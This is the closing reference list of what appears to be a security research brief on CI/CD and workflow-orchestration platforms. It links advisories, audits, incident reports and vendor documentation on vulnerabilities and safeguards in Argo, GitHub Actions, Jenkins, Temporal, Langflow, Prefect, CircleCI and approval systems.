- Argo `CVE-2025-66626` (symlink traversal RCE) — `https://www.endorlabs.com/learn/when-a-broken-fix-leads-to-rce-how-we-found-cve-2025-66626-in-argo`
- Argo `CVE-2024-53862` (auth bypass) — `https://security.snyk.io/vuln/SNYK-CHAINGUARDLATEST-ARGOWORKFLOWS-8456165`
- Argo `CVE-2024-47827` (DoS) — `https://cvefeed.io/vuln/detail/CVE-2024-47827`
- Argo Workflows CVE list — `https://www.cvedetails.com/vendor/25070/Argo-workflows-Project.html`
- Argo security overview — `https://github.com/argoproj/argo-workflows/security`
- 2022 CNCF Argo audit (OSTIF) — `https://www.cncf.io/blog/2022/07/19/2022-argo-external-security-audit-lessons-learned/`
- Ada Logics audit write-up — `https://adalogics.com/blog/argo-security-audit-2022`

**GitHub Actions / supply chain:**
- `tj-actions/changed-files` `CVE-2025-30066` — `https://github.com/advisories/ghsa-mrrh-fwg8-r2c3`
- CISA alert — `https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction`
- Wiz analysis of tj-actions compromise — `https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066`
- GitHub Actions script injections doc — `https://docs.github.com/en/actions/concepts/security/script-injections`
- GitHub Security Lab — untrusted input — `https://securitylab.github.com/resources/github-actions-untrusted-input/`
- GitHub Actions secure-use reference — `https://docs.github.com/en/actions/reference/security/secure-use`
- pull_request_target branch-protection changelog (2025-11-07) — `https://github.blog/changelog/2025-11-07-actions-pull_request_target-and-environment-branch-protections-changes/`
- `CVE-2025-61671` context — Orca pull_request_nightmare Part 2 — `https://orca.security/resources/blog/pull-request-nightmare-part-2-exploits/`
- Cache poisoning (Khan, 2024) — `https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/`
- Self-hosted runner threat analysis — `https://www.sysdig.com/blog/how-threat-actors-are-using-self-hosted-github-actions-runners-as-backdoors`
- Synacktiv self-hosted runner exploitation — `https://www.synacktiv.com/en/publications/github-actions-exploitation-self-hosted-runners`
- Compromised runners docs — `https://docs.github.com/en/actions/concepts/security/compromised-runners`

**Jenkins:**
- Jenkins Security Advisory 2024-05-02 — `https://www.jenkins.io/security/advisory/2024-05-02/`
- Jenkins Security Advisory 2024-11-13 — `https://www.jenkins.io/security/advisory/2024-11-13/`
- `CVE-2024-34144` (crafted constructor) — `https://www.cvedetails.com/cve/CVE-2024-34144/`
- `CVE-2024-34145` (sandbox-defined classes) — `https://github.com/advisories/GHSA-2g4q-9vm9-9fw4`
- Jenkins Script Security plugin — `https://plugins.jenkins.io/script-security`
- Jenkins In-process Script Approval — `https://www.jenkins.io/doc/book/managing/script-approval/`
- Pipeline Input Step docs — `https://www.jenkins.io/doc/pipeline/steps/pipeline-input-step/`
- `JENKINS-27134` (no Job/Approve permission) — `https://issues.jenkins.io/browse/JENKINS-27134`
- `JENKINS-33793` (anonymous input GET bypass) — `https://issues.jenkins.io/browse/JENKINS-33793`

**Temporal:**
- Codec Server / data encryption — `https://docs.temporal.io/production-deployment/data-encryption`
- Temporal Cloud security model — `https://docs.temporal.io/cloud/security`
- Self-hosted security features — `https://docs.temporal.io/self-hosted-guide/security`
- Converters and encryption (TS SDK) — `https://docs.temporal.io/develop/typescript/converters-and-encryption`
- Protecting sensitive data — `https://temporal.io/blog/how-to-protect-sensitive-data-in-a-temporal-application`
- Workflow Execution overview — `https://docs.temporal.io/workflow-execution`
- Idempotent signals forum thread — `https://community.temporal.io/t/preliminary-investigation-into-idempotent-signals/13694`
- Idempotency blog — `https://temporal.io/blog/idempotency-and-durable-execution`

**Langflow:**
- Langflow `CVE-2025-3248` (unauthenticated RCE) — `https://nvd.nist.gov/vuln/detail/CVE-2025-3248`
- Zscaler ThreatLabz analysis — `https://www.zscaler.com/blogs/security-research/cve-2025-3248-rce-vulnerability-langflow`
- Langflow `CVE-2025-34291` (chained CORS/CSRF → ATO+RCE) — `https://www.obsidiansecurity.com/blog/cve-2025-34291-critical-account-takeover-and-rce-vulnerability-in-the-langflow-ai-agent-workflow-platform`
- CrowdSec in-the-wild tracking — `https://www.crowdsec.net/vulntracking-report/cve-2025-34291`

**Prefect and CircleCI:**
- Prefect `CVE-2024-8183` (CORS) — `https://vulert.com/vuln-db/CVE-2024-8183`
- Prefect security page — `https://www.prefect.io/security`
- CircleCI Jan 2023 incident report — `https://circleci.com/blog/jan-4-2023-incident-report/`
- Cycode CircleCI advisory — `https://cycode.com/blog/security-advisory-circleci-security-breach/`

**Approvals and multi-phase authorization:**
- Azure Pipelines approvals — `https://learn.microsoft.com/en-us/azure/devops/pipelines/process/approvals?view=azure-devops`
- Azure Pipelines release approvals — `https://learn.microsoft.com/en-us/azure/devops/pipelines/release/approvals/approvals?view=azure-devops`
- GitLab deployment approvals — `https://docs.gitlab.com/ci/environments/deployment_approvals/`
- GitLab merge-request approval policies — `https://docs.gitlab.com/user/application_security/policies/merge_request_approval_policies/`
- GitLab bypass experiments write-up — `https://medium.com/qonto-way/experimenting-with-approval-bypass-and-more-in-gitlab-06a85c554fb5`

**Subprocess / command-injection best practice:**
- Semgrep Python command-injection cheat sheet — `https://semgrep.dev/docs/cheat-sheets/python-command-injection`
- Sourcery shell-command-injection — `https://www.sourcery.ai/vulnerabilities/shell-command-injection-python`
- SecureFlag OS command injection — `https://knowledge-base.secureflag.com/vulnerabilities/code_injection/os_command_injection_python.html`
- Datadog avoid command injection — `https://docs.datadoghq.com/security/code_security/static_analysis/static_analysis_rules/python-flask/command-injection/`

*End of brief.*
